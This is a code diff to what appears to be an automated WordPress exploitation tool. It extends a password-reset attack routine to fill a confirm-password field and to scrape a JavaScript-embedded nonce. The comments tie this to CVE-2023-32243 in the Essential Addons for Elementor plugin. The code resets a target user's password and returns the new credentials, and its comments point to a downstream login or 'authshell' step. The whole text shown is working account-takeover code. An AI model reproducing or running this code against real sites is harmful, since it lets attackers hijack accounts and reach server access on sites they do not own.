@@ -26,6 +26,8 @@ One further kind is CONFIRM-ONLY (not fully automatable):
 import re
 import secrets
 
+from . import exploit as _exploit  # reuse the JS-localized nonce scraper
+
 
 def _random_creds():
     user = "svc_" + secrets.token_hex(4)
@@ -123,6 +125,19 @@ def _password_reset(base, http, recipe):
     data = dict(recipe.get("params", {}))
     data[recipe.get("user_param", "user_login")] = target
     data[recipe.get("pass_param", "new_password")] = newpw
+    # Some reset forms require the new password twice (EA: eael-pass1/eael-pass2).
+    if recipe.get("pass_confirm_param"):
+        data[recipe["pass_confirm_param"]] = newpw
+    # …and are nonce-gated by a value printed in a page's JS rather than a hidden
+    # input (EA CVE-2023-32243: `var localize = {..."nonce":"..."}` on the home
+    # page, action 'essential-addons-elementor'). Harvest it when the recipe asks;
+    # if absent the POST still goes (a wrong/missing nonce just fails server-side,
+    # never a false positive — login/authshell downstream is the real proof).
+    nf = recipe.get("nonce_from")
+    if nf:
+        nonce = _exploit._harvest_js_nonce(http, base + nf.get("url", "/"), nf["key"])
+        if nonce:
+            data[nf.get("param", nf["key"])] = nonce
     http.post(base + recipe["endpoint"], data=data)
     return {"username": target, "password": newpw}
 
